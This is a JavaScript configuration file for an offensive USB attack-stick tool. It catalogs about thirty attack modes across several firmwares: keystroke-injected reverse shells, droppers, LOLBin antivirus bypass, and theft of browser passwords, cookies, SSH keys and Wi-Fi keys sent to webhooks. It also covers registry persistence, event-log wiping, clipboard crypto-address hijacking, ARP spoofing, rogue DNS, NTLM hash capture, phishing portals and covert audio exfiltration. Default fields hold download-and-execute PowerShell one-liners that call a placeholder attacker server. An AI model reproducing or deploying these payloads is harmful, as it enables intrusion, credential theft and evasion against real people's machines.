export const FIRMWARE_META = {
  A: { label: 'HID + Storage',       color: '#4895ef' },
  C: { label: 'Network Implant',     color: '#2dc653' },
  D: { label: 'Dual-USB C2 Relay',   color: '#f4a20a' },
  E: { label: 'USB Fuzzer',          color: '#8ecae6' },
  F: { label: 'Audio Covert Channel',color: '#ff6b9d' },
}

// configField types: 'ducky' | 'textarea' | 'text' | 'url' | 'range' | 'select' | 'toggle'
export const MODES = [

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE A — HID Keyboard / Mouse
  // ══════════════════════════════════════════════════════════════

  {
    id: 'A-01', firmware: 'A',
    name: 'RubberDucky',
    category: 'Injection',
    description: 'Full DuckyScript interpreter. Multiple payloads in flash, buttons to select, Hall axis for speed.',
    risk: 'high',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'script',   type: 'ducky',  label: 'DuckyScript payload', default: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500\nSTRING Hello from ThrustFucker!\nENTER' },
      { key: 'speed',    type: 'range',  label: 'Delay between keystrokes (ms)', min: 1, max: 200, default: 50 },
      { key: 'triggerButton', type: 'trigger', label: 'Trigger button', default: 0 },
    ],
    cheatSheet: {
      trigger: 'Configured button (trigger by default)',
      controls: [
        'X axis (Hall) → typing speed in real time',
        'Button A → payload slot 1 (if multi-payloads)',
        'Button B → payload slot 2',
        'A + B (2 s)   → next slot',
      ],
      leds: ['Slow red = ready', 'Fast red = injecting', 'Green = done'],
    },
  },

  {
    id: 'A-02', firmware: 'A',
    name: 'Reverse Shell Dropper',
    category: 'Injection',
    description: 'Injects a PowerShell/bash one-liner that opens a TCP reverse shell to your IP.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'lhost',  type: 'text',   label: 'LHOST (your IP)', default: '192.168.1.100' },
      { key: 'lport',  type: 'text',   label: 'LPORT', default: '4444' },
      { key: 'os',     type: 'select', label: 'Target OS', options: ['Windows (PowerShell)', 'Linux (bash)', 'macOS (bash)'], default: 'Windows (PowerShell)' },
      { key: 'speed',  type: 'range',  label: 'Keystroke delay (ms)', min: 1, max: 200, default: 60 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed', 'Y axis → initial delay (0–5 s)'],
      leds: ['Red = injecting', 'Green = shell active (if USB-HS feedback)'],
      notes: ['Listen with: nc -lvnp 4444', 'or: msfconsole → use exploit/multi/handler'],
    },
  },

  {
    id: 'A-03', firmware: 'A',
    name: 'Timed Payload',
    category: 'Injection',
    description: 'Configurable delay before triggering. Put the stick down, walk away, the payload executes on its own.',
    risk: 'high',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'script',  type: 'ducky', label: 'DuckyScript payload', default: 'GUI r\nDELAY 500\nSTRING cmd /c whoami > C:\\Users\\Public\\out.txt\nENTER' },
      { key: 'delay',   type: 'range', label: 'Delay before execution (seconds)', min: 5, max: 300, default: 30 },
      { key: 'speed',   type: 'range', label: 'Keystroke delay (ms)', min: 1, max: 200, default: 50 },
    ],
    cheatSheet: {
      trigger: 'Automatic after delay on plug-in',
      controls: ['Y axis → adjust delay in real time', 'Button A → cancel timer'],
      leds: ['Blinking yellow = countdown', 'Red = injecting'],
    },
  },

  {
    id: 'A-04', firmware: 'A',
    name: 'Multi-Stage Dropper',
    category: 'Injection',
    description: 'Stage 1: downloads a file via PowerShell. Stage 2: executes it. All via HID keyboard.',
    risk: 'critical',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'url',      type: 'url',    label: 'Payload URL (stage 2)', default: 'https://ton-serveur.com/payload.exe' },
      { key: 'outPath',  type: 'text',   label: 'Output path', default: '$env:TEMP\\svc.exe' },
      { key: 'exec',     type: 'toggle', label: 'Execute after download', default: true },
      { key: 'cleanup',  type: 'toggle', label: 'Delete after execution', default: true },
      { key: 'speed',    type: 'range',  label: 'Keystroke delay (ms)', min: 1, max: 200, default: 60 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed'],
      leds: ['Red = injecting', 'Green = payload downloaded'],
    },
  },

  {
    id: 'A-05', firmware: 'A',
    name: 'LOLBins Payload',
    category: 'Injection',
    description: 'Uses only native Windows binaries (certutil, mshta, regsvr32, wscript…). Bypasses AV whitelists.',
    risk: 'critical',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'lolbin',  type: 'select', label: 'LOLBin vector', options: ['certutil (base64)','mshta (vbs)','regsvr32 (COM)','wscript (js)','rundll32'], default: 'certutil (base64)' },
      { key: 'payload', type: 'textarea', label: 'Command or payload URL', default: 'https://ton-serveur.com/payload.hta' },
      { key: 'speed',   type: 'range', label: 'Keystroke delay (ms)', min: 1, max: 200, default: 60 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed'],
      leds: ['Red = injecting'],
      notes: ['certutil -decode out.b64 out.exe', 'mshta http://… (executes HTA)'],
    },
  },

  {
    id: 'A-06', firmware: 'A',
    name: 'Chrome Password Exfil',
    category: 'Exfiltration',
    description: 'Dumps Chrome passwords (DPAPI + AES-GCM). Exfil via webhook or stored on the stick (firmware B recommended).',
    risk: 'critical',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'exfilMode',  type: 'select', label: 'Destination', options: ['Webhook HTTPS','Display briefly (CLI)'], default: 'Webhook HTTPS' },
      { key: 'webhookUrl', type: 'url',    label: 'Webhook URL (Discord, HTTPS…)', default: 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN' },
      { key: 'speed',      type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → typing speed'],
      leds: ['Red = injection in progress', 'Green = script executed'],
      notes: ['PS window closes automatically after exfil', 'Check your webhook for results'],
    },
  },

  {
    id: 'A-07', firmware: 'A',
    name: 'Firefox Password Exfil',
    category: 'Exfiltration',
    description: 'Dumps logins.json + key4.db Firefox, decrypts credentials.',
    risk: 'critical',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'webhookUrl', type: 'url',   label: 'Webhook URL', default: '' },
      { key: 'speed',      type: 'range', label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed'],
      leds: ['Red = injecting', 'Green = done'],
    },
  },

  {
    id: 'A-08', firmware: 'A',
    name: 'Windows Credential Manager',
    category: 'Exfiltration',
    description: 'Extracts credentials from the Windows Credential Manager (vaultcmd + PowerShell).',
    risk: 'critical',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'webhookUrl', type: 'url',   label: 'Webhook URL', default: '' },
      { key: 'speed',      type: 'range', label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: [],
      leds: ['Red = injecting'],
    },
  },

  {
    id: 'A-09', firmware: 'A',
    name: 'Wi-Fi Password Dumper',
    category: 'Exfiltration',
    description: 'Dumps all Wi-Fi profiles in plaintext (netsh wlan). Works without admin rights on the current session.',
    risk: 'high',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'exfilMode',  type: 'select', label: 'Destination', options: ['Webhook HTTPS','Clipboard'], default: 'Webhook HTTPS' },
      { key: 'webhookUrl', type: 'url',    label: 'Webhook URL', default: '' },
      { key: 'speed',      type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 70 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed'],
      leds: ['Red = injecting', 'Green = done'],
      notes: ['Result: all PSK keys for known networks'],
    },
  },

  {
    id: 'A-10', firmware: 'A',
    name: 'SSH Key Harvester',
    category: 'Exfiltration',
    description: 'Copies ~/.ssh/ (id_rsa, id_ed25519, known_hosts, authorized_keys) to webhook or clipboard.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: ['webhook'],
    configFields: [
      { key: 'webhookUrl', type: 'url',   label: 'Webhook URL', default: '' },
      { key: 'speed',      type: 'range', label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: { trigger: 'Trigger', controls: [], leds: ['Red = injecting'] },
  },

  {
    id: 'A-11', firmware: 'A',
    name: 'Browser Cookie Stealer',
    category: 'Exfiltration',
    description: 'Steals Chrome/Edge/Firefox session cookies for web session hijacking (social networks, banking…).',
    risk: 'critical',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'browsers',   type: 'select', label: 'Target browser', options: ['Chrome','Edge','Firefox','All'], default: 'Chrome' },
      { key: 'webhookUrl', type: 'url',    label: 'Webhook URL', default: '' },
      { key: 'speed',      type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: { trigger: 'Trigger', controls: [], leds: ['Red = injecting'] },
  },

  {
    id: 'A-12', firmware: 'A',
    name: 'Environment Enumerator',
    category: 'Reconnaissance',
    description: 'whoami /all · ipconfig · arp -a · netstat · tasklist → complete snapshot in a few seconds.',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: ['webhook'],
    configFields: [
      { key: 'webhookUrl', type: 'url',   label: 'Webhook URL (leave empty = clipboard)', default: '' },
      { key: 'speed',      type: 'range', label: 'Keystroke delay (ms)', min: 10, max: 200, default: 60 },
    ],
    cheatSheet: { trigger: 'Trigger', controls: [], leds: ['Red = injecting'] },
  },

  {
    id: 'A-13', firmware: 'A',
    name: 'Startup Persistence',
    category: 'Persistence',
    description: 'Adds an HKCU\\Run key or a scheduled task to survive reboot.',
    risk: 'critical',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'method',    type: 'select',   label: 'Method', options: ['Registry HKCU\\Run','Scheduled task','Startup folder'], default: 'Registry HKCU\\Run' },
      { key: 'command',   type: 'text',     label: 'Command to persist', default: 'powershell -w hidden -c "IEX(IWR https://ton-serveur.com/stage2.ps1)"' },
      { key: 'taskName',  type: 'text',     label: 'Task name (if scheduled task)', default: 'WindowsUpdateHelper' },
      { key: 'speed',     type: 'range',    label: 'Keystroke delay (ms)', min: 10, max: 200, default: 60 },
    ],
    cheatSheet: { trigger: 'Trigger', controls: [], leds: ['Red = injecting'] },
  },

  {
    id: 'A-14', firmware: 'A',
    name: 'Phishing Launcher',
    category: 'Social Engineering',
    description: 'Silently opens a browser to a controlled URL (fake login page, corporate clone…).',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'url',      type: 'url',    label: 'Phishing URL', default: 'https://ton-serveur.com/login' },
      { key: 'browser',  type: 'select', label: 'Browser', options: ['Default','Chrome','Firefox','Edge'], default: 'Default' },
      { key: 'kiosk',    type: 'toggle', label: 'Kiosk mode (fullscreen)', default: false },
      { key: 'speed',    type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 50 },
    ],
    cheatSheet: { trigger: 'Trigger', controls: [], leds: ['Red = injecting'] },
  },

  {
    id: 'A-15', firmware: 'A',
    name: 'Anti-Forensics',
    category: 'Evasion',
    description: 'Clears Windows event logs, PowerShell history, and prefetch files.',
    risk: 'critical',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'clearLogs',     type: 'toggle', label: 'Event logs (wevtutil cl)', default: true },
      { key: 'clearPS',       type: 'toggle', label: 'PowerShell history', default: true },
      { key: 'clearPrefetch', type: 'toggle', label: 'Prefetch (requires admin)', default: false },
      { key: 'speed',         type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 70 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: [],
      leds: ['Red = injecting'],
      notes: ['Prefetch requires an admin session', 'Event logs: Security, System, Application cleared'],
    },
  },

  {
    id: 'A-16', firmware: 'A',
    name: 'Mouse Jiggler',
    category: 'Utility',
    description: 'Random micro mouse movements via Hall sensors. Prevents screen lock indefinitely.',
    risk: 'low',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'amplitude', type: 'range', label: 'Amplitude (px)', min: 1, max: 20, default: 3 },
      { key: 'interval',  type: 'range', label: 'Interval (seconds)', min: 5, max: 60, default: 15 },
    ],
    cheatSheet: {
      trigger: 'Plug in → active immediately',
      controls: ['X axis → jiggle amplitude', 'Y axis → interval', 'Button A → pause/resume'],
      leds: ['Slow blinking green = active'],
    },
  },

  {
    id: 'A-17', firmware: 'A',
    name: 'Auto-Login Replayer',
    category: 'Utility',
    description: 'Replays a stored login/password sequence on demand. Useful for quick access or lockout testing.',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'username', type: 'text',  label: 'Username', default: '' },
      { key: 'password', type: 'text',  label: 'Password (stored in flash)', default: '' },
      { key: 'sequence', type: 'ducky', label: 'Full sequence (DuckyScript)', default: 'DELAY 500\n$USERNAME\nTAB\n$PASSWORD\nENTER' },
      { key: 'speed',    type: 'range', label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: {
      trigger: 'Trigger',
      controls: ['X axis → speed'],
      leds: ['Red = injecting'],
      notes: ['The password is stored encrypted in the stick\'s flash'],
    },
  },

  {
    id: 'A-18', firmware: 'A',
    name: 'Clipboard Hijacker',
    category: 'Persistence',
    description: 'Monitors then overwrites the clipboard (crypto address, C2 URL, forged credentials).',
    risk: 'high',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'replaceWith', type: 'text',  label: 'Replacement content', default: '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf1' },
      { key: 'trigger',     type: 'select', label: 'Trigger', options: ['On plug-in','On button'], default: 'On button' },
      { key: 'delay',       type: 'range', label: 'Delay before activation (s)', min: 0, max: 60, default: 5 },
    ],
    cheatSheet: {
      trigger: 'Configurable',
      controls: ['Button A → enable/disable'],
      leds: ['Yellow = active (monitoring)'],
    },
  },

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE A — HID + Storage (ex-B merged)
  // ══════════════════════════════════════════════════════════════

  {
    id: 'B-01', firmware: 'A',
    name: 'USB Ninja Drop',
    category: 'Injection',
    description: 'Appears as USB drive + keyboard. Drops an executable onto the "drive", keyboard launches it via explorer.',
    risk: 'critical',
    os: ['windows'],
    exfil: ['device'],
    configFields: [
      { key: 'payloadFile', type: 'text',   label: 'Dropped file name', default: 'update.exe' },
      { key: 'autorun',     type: 'toggle', label: 'Auto-launch (keyboard)', default: true },
      { key: 'driveName',   type: 'text',   label: 'USB drive name', default: 'LEXAR 16GB' },
      { key: 'speed',       type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 70 },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: ['Button A → trigger manual launch'],
      leds: ['Blue = USB mounted', 'Red = keyboard injection'],
      notes: ['Copy payload.exe to assets/firmware/ninja_payload.bin before flashing'],
    },
  },

  {
    id: 'B-02', firmware: 'A',
    name: 'Chrome Exfil → Flash',
    category: 'Exfiltration',
    description: 'Dumps Chrome passwords + cookies, stores results in stick flash. Retrieve by plugging back into your PC.',
    risk: 'critical',
    os: ['windows'],
    exfil: ['device'],
    configFields: [
      { key: 'driveName',  type: 'text',   label: 'USB drive name (appearance)', default: 'KINGSTON 8GB' },
      { key: 'filename',   type: 'text',   label: 'Results file name', default: 'report.txt' },
      { key: 'speed',      type: 'range',  label: 'Keystroke delay (ms)', min: 10, max: 200, default: 80 },
    ],
    cheatSheet: {
      trigger: 'Trigger — injects PS script, results written to the "USB drive"',
      controls: ['Button A → show results file size (LED code)'],
      leds: ['Blue = drive mounted', 'Red = PS injection', 'Blinking green = writing results'],
      notes: ['Unplug then replug into your PC to read report.txt'],
    },
  },

  {
    id: 'B-03', firmware: 'A',
    name: 'LNK Dropper',
    category: 'Persistence',
    description: 'Drops a malicious .lnk file into the Startup folder via mass storage. Persistence without a single keystroke.',
    risk: 'critical',
    os: ['windows'],
    exfil: [],
    configFields: [
      { key: 'command',   type: 'text', label: '.lnk target command', default: 'powershell -w h -c "IEX(IWR https://ton-serveur.com/s2)"' },
      { key: 'lnkName',   type: 'text', label: '.lnk name', default: 'WindowsHelper.lnk' },
      { key: 'driveName', type: 'text', label: 'USB drive name', default: 'USB DISK' },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in (mass storage) + button A to copy the .lnk',
      controls: [],
      leds: ['Blue = drive mounted', 'Green = .lnk dropped'],
    },
  },

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE C — Network Implant (RNDIS/CDC-NCM)
  // ══════════════════════════════════════════════════════════════

  {
    id: 'C-01', firmware: 'C',
    name: 'Rogue DHCP / DNS',
    category: 'Network',
    description: 'Imposes itself as the network gateway, responds to DNS queries with your IPs. Transparent traffic redirection.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'fakeGateway', type: 'text', label: 'Fake gateway IP', default: '192.168.100.1' },
      { key: 'dnsRedirect', type: 'textarea', label: 'DNS redirections (domain=IP, one per line)', default: 'microsoft.com=192.168.100.1\ngoogle.com=192.168.100.1' },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: ['X axis → enable/disable redirections', 'Button A → toggle DHCP on/off'],
      leds: ['Green = DHCP active', 'Yellow = DNS redirect active'],
    },
  },

  {
    id: 'C-02', firmware: 'C',
    name: 'HTTP Interceptor',
    category: 'Network',
    description: 'Transparent proxy on port 80. Injects JavaScript into HTTP (non-HTTPS) pages passing through the stick.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'injectScript', type: 'textarea', label: 'JS script to inject', default: 'document.title="[INTERCEPTED] "+document.title;' },
      { key: 'logRequests',  type: 'toggle',  label: 'Log HTTP requests', default: true },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: ['Button A → toggle JS injection', 'Button B → clear log (LED flash)'],
      leds: ['Green = proxy active', 'Blinking yellow = request intercepted'],
    },
  },

  {
    id: 'C-03', firmware: 'C',
    name: 'Responder-lite',
    category: 'Network',
    description: 'Responds to LLMNR / NBT-NS / mDNS broadcasts to capture NTLMv2 hashes without third-party software.',
    risk: 'critical',
    os: ['windows'],
    exfil: ['webhook'],
    configFields: [
      { key: 'fakeIP',    type: 'text',   label: 'IP to announce', default: '192.168.100.1' },
      { key: 'protocols', type: 'select', label: 'Protocols', options: ['LLMNR + NBT-NS + mDNS','LLMNR only','NBT-NS only'], default: 'LLMNR + NBT-NS + mDNS' },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: ['Button A → dump captured hashes to flash file'],
      leds: ['Green = listening', 'Blinking red = hash captured'],
      notes: ['Hashes stored in flash, replug into PC to extract', 'Crack with: hashcat -m 5600 hashes.txt wordlist.txt'],
    },
  },

  {
    id: 'C-04', firmware: 'C',
    name: 'Captive Portal',
    category: 'Social Engineering',
    description: 'Forces HTTP redirection to a fake login page. Captures submitted credentials.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: ['webhook'],
    configFields: [
      { key: 'portalTitle', type: 'text',     label: 'Page title', default: 'Network authentication required' },
      { key: 'portalHtml',  type: 'textarea', label: 'Page HTML (optional — default if empty)', default: '' },
      { key: 'redirectUrl', type: 'url',      label: 'Redirect after submission', default: 'https://google.com' },
    ],
    cheatSheet: {
      trigger: 'Automatic',
      controls: ['Button A → export captured credentials to flash'],
      leds: ['Green = portal active', 'Red = credential received'],
    },
  },

  {
    id: 'C-05', firmware: 'C',
    name: 'ARP Spoofer',
    category: 'Network',
    description: 'MITM on the local segment via ARP poisoning. Intercepts traffic between two hosts.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'targetIP',  type: 'text', label: 'Victim IP', default: '192.168.1.50' },
      { key: 'gatewayIP', type: 'text', label: 'Real gateway IP', default: '192.168.1.1' },
    ],
    cheatSheet: {
      trigger: 'Button A to start / stop',
      controls: ['X axis → spoofed ARP send rate'],
      leds: ['Red = spoofing active'],
    },
  },

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE D — Dual-USB C2 Relay
  // ══════════════════════════════════════════════════════════════

  {
    id: 'D-01', firmware: 'D',
    name: 'Live Keyboard Relay',
    category: 'C2',
    description: 'You type in ThrustFucker → injected in real time on the target via HID. No pre-programming.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'layoutCible', type: 'select', label: 'Target keyboard layout', options: ['QWERTY US','AZERTY FR','QWERTZ DE'], default: 'QWERTY US' },
      { key: 'echoMode',    type: 'toggle', label: 'Echo in launcher', default: true },
    ],
    cheatSheet: {
      trigger: 'Via console in ThrustFucker (C2 tab)',
      controls: ['X axis → keystroke delay (anti-EDR)', 'Button A → pause relay', 'Button B → emergency CTRL+C on target'],
      leds: ['Green = C2 channel connected', 'Yellow = typing in progress'],
    },
  },

  {
    id: 'D-02', firmware: 'D',
    name: 'C2 Encrypted Channel',
    category: 'C2',
    description: 'Same principle as D-01 but the OTG-HS channel is AES-128 encrypted. Serial traffic unreadable if intercepted.',
    risk: 'critical',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'aesKey', type: 'text', label: 'AES-128 key (32 hex chars)', default: 'DEADBEEF0123456789ABCDEF01234567' },
      { key: 'layoutCible', type: 'select', label: 'Target keyboard layout', options: ['QWERTY US','AZERTY FR'], default: 'QWERTY US' },
    ],
    cheatSheet: {
      trigger: 'Via console in ThrustFucker',
      controls: ['X axis → keystroke delay'],
      leds: ['Green = encrypted channel active'],
    },
  },

  {
    id: 'D-03', firmware: 'D',
    name: 'Exfil Data Receiver',
    category: 'C2',
    description: 'The script injected on the target writes stolen data to the virtual COM port (OTG-HS). Displayed live in the launcher.',
    risk: 'critical',
    os: ['windows'],
    exfil: ['dual-usb'],
    configFields: [
      { key: 'payload', type: 'ducky', label: 'DuckyScript payload (must write to COM)', default: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w h "$p=[System.IO.Ports.SerialPort]::new(\'COM3\',9600);$p.Open();$p.WriteLine((whoami));$p.Close()"\nENTER' },
      { key: 'baudRate', type: 'select', label: 'Baud rate', options: ['9600','115200'], default: '9600' },
    ],
    cheatSheet: {
      trigger: 'Trigger → inject payload → data received in C2 tab of launcher',
      controls: [],
      leds: ['Green = COM open', 'Blinking yellow = data received'],
    },
  },

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE E — USB Fuzzer
  // ══════════════════════════════════════════════════════════════

  {
    id: 'E-01', firmware: 'E',
    name: 'Descriptor Length Fuzzer',
    category: 'Fuzzing',
    description: 'Sends USB descriptors of random/excessive length to the target host. Targets embedded USB drivers.',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'minLen',   type: 'range', label: 'Min descriptor length', min: 0, max: 18, default: 0 },
      { key: 'maxLen',   type: 'range', label: 'Max descriptor length', min: 19, max: 255, default: 255 },
      { key: 'delay',    type: 'range', label: 'Delay between cases (ms)', min: 10, max: 5000, default: 200 },
      { key: 'autoLoop', type: 'toggle', label: 'Auto loop', default: true },
    ],
    cheatSheet: {
      trigger: 'Button A = start / stop',
      controls: ['X axis → descriptor length in real time', 'Y axis → delay between cases'],
      leds: ['Yellow = fuzzing in progress', 'Red = crash detected (USB enum lost)'],
    },
  },

  {
    id: 'E-02', firmware: 'E',
    name: 'Device Impersonator',
    category: 'Fuzzing',
    description: 'Clones the VID/PID/descriptors of a known device. Deceives the host about the device identity.',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'vid',     type: 'text',   label: 'VID (hex)', default: '046D' },
      { key: 'pid',     type: 'text',   label: 'PID (hex)', default: 'C52B' },
      { key: 'product', type: 'text',   label: 'Product string', default: 'USB Receiver' },
      { key: 'vendor',  type: 'text',   label: 'Manufacturer string', default: 'Logitech' },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: [],
      leds: ['Blue = enumeration in progress', 'Green = accepted by host'],
    },
  },

  {
    id: 'E-03', firmware: 'E',
    name: 'Enumeration Crasher',
    category: 'Fuzzing',
    description: 'Responds with valid descriptors on the 1st enumeration, then corrupts on the 2nd. Pattern that crashes some drivers.',
    risk: 'medium',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'corruptField', type: 'select', label: 'Field to corrupt', options: ['bLength','bNumInterfaces','wTotalLength','bNumEndpoints'], default: 'wTotalLength' },
      { key: 'delay',        type: 'range',  label: 'Delay before 2nd enum (ms)', min: 100, max: 5000, default: 500 },
    ],
    cheatSheet: {
      trigger: 'Button A = reset cycle',
      controls: [],
      leds: ['Blue = 1st enum (normal)', 'Red = 2nd enum (corrupted)'],
    },
  },

  // ══════════════════════════════════════════════════════════════
  //  FIRMWARE F — Audio Covert Channel
  // ══════════════════════════════════════════════════════════════

  {
    id: 'F-01', firmware: 'F',
    name: 'FSK Exfil',
    category: 'Covert Channel',
    description: 'Encodes data (passwords, text files) as FSK tones on the 3.5mm jack. No network or USB trace.',
    risk: 'high',
    os: ['windows', 'linux', 'macos'],
    exfil: ['audio'],
    configFields: [
      { key: 'dataSource',  type: 'select',   label: 'Data source', options: ['Stick flash','Chrome payload (A-06 prerequisite)'], default: 'Stick flash' },
      { key: 'baud',        type: 'select',   label: 'FSK baud rate', options: ['300 bps (reliable)','1200 bps','2400 bps'], default: '1200 bps' },
      { key: 'freq0',       type: 'range',    label: 'Bit 0 frequency (Hz)', min: 500, max: 3000, default: 1070 },
      { key: 'freq1',       type: 'range',    label: 'Bit 1 frequency (Hz)', min: 500, max: 3000, default: 1270 },
    ],
    cheatSheet: {
      trigger: 'Trigger = start transmission',
      controls: ['X axis → signal volume/amplitude', 'Button A → pause'],
      leds: ['Blinking red = transmission in progress'],
      notes: ['Receiver: record audio + decode with minimodem or Python FSK script'],
    },
  },

  {
    id: 'F-02', firmware: 'F',
    name: 'DTMF Command Receiver',
    category: 'Covert Channel',
    description: 'Receives DTMF-encoded commands via the jack microphone. Triggers actions without touching the stick.',
    risk: 'high',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'cmdMap', type: 'textarea', label: 'DTMF command table (code=action)', default: '1=trigger_payload_1\n2=trigger_payload_2\n*=cancel\n#=reset' },
    ],
    cheatSheet: {
      trigger: 'Emit DTMF tones into the jack microphone (phone or tone generator)',
      controls: [],
      leds: ['Blinking green = listening', 'Yellow = command received'],
    },
  },

  {
    id: 'F-03', firmware: 'F',
    name: 'Acoustic Beacon',
    category: 'Covert Channel',
    description: 'Periodically emits an encoded audio "ping" (stick ID + timestamp). Useful for detecting device presence.',
    risk: 'low',
    os: ['windows', 'linux', 'macos'],
    exfil: [],
    configFields: [
      { key: 'beaconId',  type: 'text',  label: 'Stick identifier', default: 'STICK-01' },
      { key: 'interval',  type: 'range', label: 'Beacon interval (seconds)', min: 10, max: 3600, default: 60 },
      { key: 'amplitude', type: 'range', label: 'Volume (inaudible if < 30)', min: 0, max: 100, default: 20 },
    ],
    cheatSheet: {
      trigger: 'Automatic on plug-in',
      controls: ['Button A → force immediate beacon', 'Button B → silence'],
      leds: ['Fast green flash = beacon emitted'],
    },
  },
]

export const getModesByFirmware = (fw) => MODES.filter(m => m.firmware === fw)
export const getModeById        = (id) => MODES.find(m => m.id === id)
